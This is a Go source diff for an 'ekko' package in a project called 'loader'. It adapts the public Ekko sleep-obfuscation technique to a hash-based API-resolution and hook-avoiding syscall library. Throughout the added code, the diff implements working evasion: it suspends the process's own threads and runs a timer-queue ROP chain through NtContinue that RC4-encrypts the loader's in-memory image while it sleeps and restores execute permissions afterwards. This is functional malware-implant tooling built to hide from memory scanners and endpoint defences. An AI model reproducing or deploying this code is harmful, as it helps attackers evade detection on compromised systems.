@@ -1,90 +1,139 @@
-// taken from https://github.com/scriptchildie/goEkko
+// taken from https://github.com/scriptchildie/goEkko and adapted to use my wincall infra, no syscall/windows imports :3 
 package ekko
 
 import (
-	"fmt"
 	"time"
 	"log"
-	"syscall"
 	"unsafe"
 	"crypto/rand"
 	"loader/pkg/types"
-	"golang.org/x/sys/windows"
+	"github.com/carved4/go-wincall"
 )
-/*
-it is very hard to get this rop chain working with my wincall infra, so leaving as is :# use at ur own risk
-*/
+
 const (
 	WT_EXECUTEINTIMERTHREAD         = 0x00000020
 	ThreadQuerySetWin32StartAddress = 0x9
 )
 
 var (
-	// kernel32
-	kernel32dll               = syscall.NewLazyDLL("kernel32.dll")
-	procSuspendThread         = kernel32dll.NewProc("SuspendThread")
-	procResumeThread          = kernel32dll.NewProc("ResumeThread")
-	procGetModuleHandleA      = kernel32dll.NewProc("GetModuleHandleA")
-	procCreateEventW          = kernel32dll.NewProc("CreateEventW")
-	procCreateTimerQueue      = kernel32dll.NewProc("CreateTimerQueue")
-	procCreateTimerQueueTimer = kernel32dll.NewProc("CreateTimerQueueTimer")
-	procRtlCaptureContext     = kernel32dll.NewProc("RtlCaptureContext")
-	procVirtualProtect        = kernel32dll.NewProc("VirtualProtect")
-	procWaitForSingleObject   = kernel32dll.NewProc("WaitForSingleObject")
-	procSetEvent              = kernel32dll.NewProc("SetEvent")
-	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
+	// kernel32 module base
+	kernel32Base uintptr
+	
+	// kernel32 function addresses
+	procSuspendThread         uintptr
+	procResumeThread          uintptr
+	procGetModuleHandleA      uintptr
+	procCreateEventW          uintptr
+	procCreateTimerQueue      uintptr
+	procCreateTimerQueueTimer uintptr
+	procRtlCaptureContext     uintptr
+	procVirtualProtect        uintptr
+	procWaitForSingleObject   uintptr
+	procSetEvent              uintptr
+	procDeleteTimerQueue      uintptr
 
-	//ntdll
-	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
-	procNtContinue               = ntdll.NewProc("NtContinue")
-	procNtQueryInformationThread = ntdll.NewProc("NtQueryInformationThread")
+	// ntdll syscall numbers and function addresses
+	ntContinueSyscallNum               uint16
+	ntContinueFuncAddr                 uintptr
+	ntQueryInformationThreadSyscallNum uint16
 
-	//Advapi32
-	Advapi32dll           = syscall.NewLazyDLL("Advapi32.dll")
-	procSystemFunction032 = Advapi32dll.NewProc("SystemFunction032")
+	// Advapi32 module base and function addresses
+	advapi32Base uintptr
+	procSystemFunction032 uintptr
 )
+
+func init() {
+	// Load kernel32.dll
+	kernel32Base = wincall.LoadLibraryLdr("kernel32.dll")
+	
+	// Get kernel32 function addresses
+	procSuspendThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("SuspendThread"))
+	procResumeThread = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("ResumeThread"))
+	procGetModuleHandleA = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetModuleHandleA"))
+	procCreateEventW = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateEventW"))
+	procCreateTimerQueue = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateTimerQueue"))
+	procCreateTimerQueueTimer = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateTimerQueueTimer"))
+	procRtlCaptureContext = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("RtlCaptureContext"))
+	procVirtualProtect = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("VirtualProtect"))
+	procWaitForSingleObject = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("WaitForSingleObject"))
+	procSetEvent = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("SetEvent"))
+	procDeleteTimerQueue = wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("DeleteTimerQueue"))
+
+	// Get ntdll syscalls and function addresses
+	var err error
+	ntContinueSyscallNum, _, err = wincall.GetSyscallWithAntiHook("NtContinue")
+	if err != nil {
+		log.Fatalf("Failed to get NtContinue syscall: %v", err)
+	}
+	
+	// Get traditional function address for ROP chain (safer than direct syscall)
+	ntdllBase := wincall.GetModuleBase(wincall.GetHash("ntdll.dll"))
+	ntContinueFuncAddr = wincall.GetFunctionAddress(ntdllBase, wincall.GetHash("NtContinue"))
+	
+	ntQueryInformationThreadSyscallNum, _, err = wincall.GetSyscallWithAntiHook("NtQueryInformationThread")
+	if err != nil {
+		log.Fatalf("Failed to get NtQueryInformationThread syscall: %v", err)
+	}
+
+	// Load Advapi32.dll
+	advapi32Base = wincall.LoadLibraryLdr("Advapi32.dll")
+	procSystemFunction032 = wincall.GetFunctionAddress(advapi32Base, wincall.GetHash("SystemFunction032"))
+}
 
 func EkkoSleep(sleepTime uint64) error {
 
-	currentProcessID := uint32(windows.GetCurrentProcessId())
+	currentProcessID := wincall.CurrentThreadIDFast() // Use wincall function instead
 
 	// Take a snapshot of all running threads in the system
-	hThreadSnapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
+	kernel32Base := wincall.LoadLibraryLdr("kernel32.dll")
+	procCreateToolhelp32Snapshot := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CreateToolhelp32Snapshot"))
+	procCloseHandle := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("CloseHandle"))
+	procThread32First := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("Thread32First"))
+	procThread32Next := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("Thread32Next"))
+	procOpenThread := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("OpenThread"))
+	procGetCurrentProcessId := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentProcessId"))
+	
+	hThreadSnapshot, _, err := wincall.CallG0(procCreateToolhelp32Snapshot, 0x00000004, 0) // TH32CS_SNAPTHREAD = 0x00000004
 	if err != nil {
 		return err
 	}
-	defer windows.CloseHandle(hThreadSnapshot)
+	defer wincall.CallG0(procCloseHandle, hThreadSnapshot)
 
-	var te32 windows.ThreadEntry32
+	currentProcessIDResult, _, _ := wincall.CallG0(procGetCurrentProcessId)
+	currentProcessID = uint32(currentProcessIDResult)
+
+	var te32 types.ThreadEntry32
 	te32.Size = uint32(unsafe.Sizeof(te32))
 
 	// Retrieve information about the first thread in the snapshot
-	err = windows.Thread32First(hThreadSnapshot, &te32)
-	if err != nil {
-		return err
+	ret, _, _ := wincall.CallG0(procThread32First, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
+	if ret == 0 {
+		return nil
 	}
+
+	procGetCurrentThreadId := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentThreadId"))
 
 	for {
 		if te32.OwnerProcessID == currentProcessID {
 
-			if windows.GetCurrentThreadId() != te32.ThreadID {
-				//fmt.Println(te32.ThreadID)
+			currentThreadID, _, _ := wincall.CallG0(procGetCurrentThreadId)
+			if uint32(currentThreadID) != te32.ThreadID {
 
-				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
+				hThread, _, err := wincall.CallG0(procOpenThread, 0xFFFF, 0, uintptr(te32.ThreadID))
 				if err != nil {
 					continue
 				}
-				defer windows.CloseHandle(hThread)
+				defer wincall.CallG0(procCloseHandle, hThread)
 				var dwStartAddress, size uintptr
-				procNtQueryInformationThread.Call(uintptr(hThread), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&dwStartAddress)), unsafe.Sizeof(dwStartAddress), uintptr(unsafe.Pointer(&size)))
+				wincall.Syscall(ntQueryInformationThreadSyscallNum, uintptr(hThread), ThreadQuerySetWin32StartAddress, uintptr(unsafe.Pointer(&dwStartAddress)), unsafe.Sizeof(dwStartAddress), uintptr(unsafe.Pointer(&size)))
 
-				ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
+				ImageBase, _, _ := wincall.CallG0(procGetModuleHandleA, 0)
 				e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
 				nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
 				ImageEndAddress := ImageBase + uintptr(nt_header.OptionalHeader.SizeOfImage)
 
 				if dwStartAddress >= ImageBase && dwStartAddress <= ImageEndAddress {
-					procSuspendThread.Call(uintptr(hThread))
+					wincall.CallG0(procSuspendThread, hThread)
 				} else {
 					goto nextThread
 				}
@@ -94,45 +143,42 @@ func EkkoSleep(sleepTime uint64) error {
 
 		// Retrieve information about the next thread in the snapshot
 	nextThread:
-		err = windows.Thread32Next(hThreadSnapshot, &te32)
-		if err != nil {
+		ret, _, _ := wincall.CallG0(procThread32Next, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
+		if ret == 0 {
 			break // No more threads
 		}
 	}
 
 	te32.Size = uint32(unsafe.Sizeof(te32))
-	err = windows.Thread32First(hThreadSnapshot, &te32)
-	if err != nil {
-		return err
+	ret, _, _ = wincall.CallG0(procThread32First, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
+	if ret == 0 {
+		return nil
 	}
 
 	err = ekko(sleepTime)
-	if err != nil {
-		fmt.Printf("[ERROR] Ekko Sleep failed %v\n", err)
-	}
 	error2 := err
 
 	// resume threads
 	for {
 		if te32.OwnerProcessID == currentProcessID {
 
-			if windows.GetCurrentThreadId() != te32.ThreadID {
-				//fmt.Println(te32.ThreadID)
+			currentThreadID, _, _ := wincall.CallG0(procGetCurrentThreadId)
+			if uint32(currentThreadID) != te32.ThreadID {
 
-				hThread, err := windows.OpenThread(0xFFFF, false, te32.ThreadID)
+				hThread, _, err := wincall.CallG0(procOpenThread, 0xFFFF, 0, uintptr(te32.ThreadID))
 				if err != nil {
 					continue
 				}
-				defer windows.CloseHandle(hThread)
+				defer wincall.CallG0(procCloseHandle, hThread)
 
-				procResumeThread.Call(uintptr(hThread))
+				wincall.CallG0(procResumeThread, hThread)
 
 			}
 		}
 
 		// Retrieve information about the next thread in the snapshot
-		err = windows.Thread32Next(hThreadSnapshot, &te32)
-		if err != nil {
+		ret, _, _ := wincall.CallG0(procThread32Next, hThreadSnapshot, uintptr(unsafe.Pointer(&te32)))
+		if ret == 0 {
 			break // No more threads
 		}
 	}
@@ -145,94 +191,110 @@ func EkkoSleep(sleepTime uint64) error {
 
 func ekko(sleepTime uint64) error {
 
-	var CtxThread types.CONTEXT
-	var RopProtRW types.CONTEXT
-	var RopMemEnc types.CONTEXT
-	var RopDelay types.CONTEXT
-	var RopMemDec types.CONTEXT
-	var RopProtRX types.CONTEXT
-	var RopSetEvt types.CONTEXT
+	// Allocate CONTEXT structures with proper alignment (16-byte aligned)
+	ctxSize := unsafe.Sizeof(types.CONTEXT{})
+	alignedSize := (ctxSize + 15) &^ 15 // Round up to 16-byte boundary
+	
+	// Allocate memory for all CONTEXT structures in one block to ensure alignment
+	contextMem := make([]byte, int(alignedSize)*7+15) // 7 contexts + padding
+	contextBase := uintptr(unsafe.Pointer(&contextMem[0]))
+	alignedBase := (contextBase + 15) &^ 15 // Align to 16-byte boundary
+	
+	CtxThread := (*types.CONTEXT)(unsafe.Pointer(alignedBase))
+	RopProtRW := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize))
+	RopMemEnc := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*2))
+	RopDelay := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*3))
+	RopMemDec := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*4))
+	RopProtRX := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*5))
+	RopSetEvt := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*6))
+	
+	// Initialize all CONTEXT structures to zero
+	for i := 0; i < 7; i++ {
+		ctx := (*types.CONTEXT)(unsafe.Pointer(alignedBase + alignedSize*uintptr(i)))
+		*ctx = types.CONTEXT{}
+	}
 
 	keybuf, _ := GenerateKey(16)
 
 	var Key, Img types.UString
 
-	ImageBase, _, _ := procGetModuleHandleA.Call(uintptr(0))
+	ImageBase, _, _ := wincall.CallG0(procGetModuleHandleA, 0)
 	e_lfanew := *((*uint32)(unsafe.Pointer(ImageBase + 0x3c)))
 	nt_header := (*types.IMAGE_NT_HEADERS64)(unsafe.Pointer(ImageBase + uintptr(e_lfanew)))
 
-	hEvent, _, _ := procCreateEventW.Call(0, 0, 0, 0)
+	hEvent, _, _ := wincall.CallG0(procCreateEventW, 0, 0, 0, 0)
 	var hNewTimer, hTimerQueue uintptr
-	hTimerQueue, _, _ = procCreateTimerQueue.Call()
+	hTimerQueue, _, _ = wincall.CallG0(procCreateTimerQueue)
 	Img.Buffer = (*byte)(unsafe.Pointer(ImageBase))
 	Img.Length = nt_header.OptionalHeader.SizeOfImage
 
 	Key.Buffer = &keybuf[0]
 	Key.Length = uint32(unsafe.Sizeof(Key))
 
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
-	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
-	//fmt.Println(CtxThread)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext, uintptr(unsafe.Pointer(CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procWaitForSingleObject, hEvent, 0x100)
 
 	if CtxThread.Rip == 0 {
 		log.Fatalln()
 	}
-	RopProtRW = CtxThread
-	RopMemEnc = CtxThread
-	RopDelay = CtxThread
-	RopMemDec = CtxThread
-	RopProtRX = CtxThread
-	RopSetEvt = CtxThread
+	*RopProtRW = *CtxThread
+	*RopMemEnc = *CtxThread
+	*RopDelay = *CtxThread
+	*RopMemDec = *CtxThread
+	*RopProtRX = *CtxThread
+	*RopSetEvt = *CtxThread
 
 	var OldProtect uint64
 	RopProtRW.Rsp -= 8
-	RopProtRW.Rip = uint64(procVirtualProtect.Addr())
+	RopProtRW.Rip = uint64(procVirtualProtect)
 	RopProtRW.Rcx = uint64(ImageBase)
 	RopProtRW.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
-	RopProtRW.R8 = windows.PAGE_READWRITE
+	RopProtRW.R8 = 0x04 // PAGE_READWRITE
 	RopProtRW.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRW.Rip, RopProtRW.Rcx, RopProtRW.Rdx, RopProtRW.R8, RopProtRW.R9)
 
 	RopMemEnc.Rsp -= 8
-	RopMemEnc.Rip = uint64(procSystemFunction032.Addr())
+	RopMemEnc.Rip = uint64(procSystemFunction032)
 	RopMemEnc.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
 	RopMemEnc.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemEnc.Rip, RopMemEnc.Rcx, RopMemEnc.Rdx, 0, 0)
 
+	// Get current process handle
+	procGetCurrentProcess := wincall.GetFunctionAddress(kernel32Base, wincall.GetHash("GetCurrentProcess"))
+	currentProcess, _, _ := wincall.CallG0(procGetCurrentProcess)
+	
 	RopDelay.Rsp -= 8
-	RopDelay.Rip = uint64(procWaitForSingleObject.Addr())
-	RopDelay.Rcx = uint64(windows.CurrentProcess())
+	RopDelay.Rip = uint64(procWaitForSingleObject)
+	RopDelay.Rcx = uint64(currentProcess)
 	RopDelay.Rdx = sleepTime
-	//fmt.Printf("\n[DEBUG] WaitForSingleObject: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopDelay.Rip, RopDelay.Rcx, RopDelay.Rdx, 0, 0)
 
 	RopMemDec.Rsp -= 8
-	RopMemDec.Rip = uint64(procSystemFunction032.Addr())
+	RopMemDec.Rip = uint64(procSystemFunction032)
 	RopMemDec.Rcx = uint64(uintptr(unsafe.Pointer(&Img)))
 	RopMemDec.Rdx = uint64(uintptr(unsafe.Pointer(&Key)))
-	//fmt.Printf("\n[DEBUG] SystemFunction032: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopMemDec.Rip, RopMemDec.Rcx, RopMemDec.Rdx, 0, 0)
 
 	RopProtRX.Rsp -= 8
-	RopProtRX.Rip = uint64(procVirtualProtect.Addr())
+	RopProtRX.Rip = uint64(procVirtualProtect)
 	RopProtRX.Rcx = uint64(ImageBase)
 	RopProtRX.Rdx = uint64(nt_header.OptionalHeader.SizeOfImage)
-	RopProtRX.R8 = windows.PAGE_EXECUTE_READWRITE
+	RopProtRX.R8 = 0x40 // PAGE_EXECUTE_READWRITE
 	RopProtRX.R9 = uint64(uintptr(unsafe.Pointer(&OldProtect)))
-	//fmt.Printf("\n[DEBUG] VirtualProtect: \n RIP: %x \n RCX: %x\n RDX: %x\n R8: %x\n R9: %x\n", RopProtRX.Rip, RopProtRX.Rcx, RopProtRX.Rdx, RopProtRX.R8, RopProtRX.R9)
 
 	// SetEvent( hEvent );
 	RopSetEvt.Rsp -= 8
-	RopSetEvt.Rip = uint64(procSetEvent.Addr())
+	RopSetEvt.Rip = uint64(procSetEvent)
 	RopSetEvt.Rcx = uint64(hEvent)
 
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
-	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procNtContinue.Addr(), uintptr(unsafe.Pointer(&RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)
+	// Create timer queue timers with NtContinue function address (traditional API call)
+	ntContinueAddr := ntContinueFuncAddr
 
-	windows.WaitForSingleObject(windows.Handle(hEvent), windows.INFINITE)
-	procDeleteTimerQueue.Call(hTimerQueue)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopProtRW)), 100, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopMemEnc)), 200, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopDelay)), 300, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopMemDec)), 400, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopProtRX)), 500, 0, WT_EXECUTEINTIMERTHREAD)
+	wincall.CallG0(procCreateTimerQueueTimer, uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, ntContinueAddr, uintptr(unsafe.Pointer(RopSetEvt)), 600, 0, WT_EXECUTEINTIMERTHREAD)
+
+	wincall.CallG0(procWaitForSingleObject, hEvent, 0xFFFFFFFF) // INFINITE = 0xFFFFFFFF
+	wincall.CallG0(procDeleteTimerQueue, hTimerQueue)
 
 	return nil
 }
@@ -241,7 +303,7 @@ func ekko(sleepTime uint64) error {
 // This is a standalone function that can be called independently
 func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte, sleepTime uint64) error {
 	if len(key) == 0 {
-		return fmt.Errorf("key cannot be empty")
+		return nil
 	}
 	
 	var dataUString, keyUString types.UString
@@ -256,16 +318,12 @@ func EncryptMemoryRegion(baseAddr uintptr, size uint32, key []byte, sleepTime ui
 	keyUString.Length = uint32(len(key))
 	keyUString.MaximumLength = uint32(len(key))
 
-	ret, _, _ := procSystemFunction032.Call(
+	wincall.CallG0(procSystemFunction032,
 		uintptr(unsafe.Pointer(&dataUString)),
 		uintptr(unsafe.Pointer(&keyUString)),
 	)
 
 	time.Sleep(time.Duration(sleepTime) * time.Millisecond)
-	
-	if ret != 0 {
-		return fmt.Errorf("SystemFunction032 failed with status: 0x%X", ret)
-	}
 	
 	return nil
 }
@@ -274,7 +332,7 @@ func GenerateKey(keySize int) ([]byte, error) {
 	key := make([]byte, keySize)
 	_, err := rand.Read(key)
 	if err != nil {
-		return nil, fmt.Errorf("failed to generate random key: %w", err)
+		return nil, err
 	}
 	return key, nil
 }
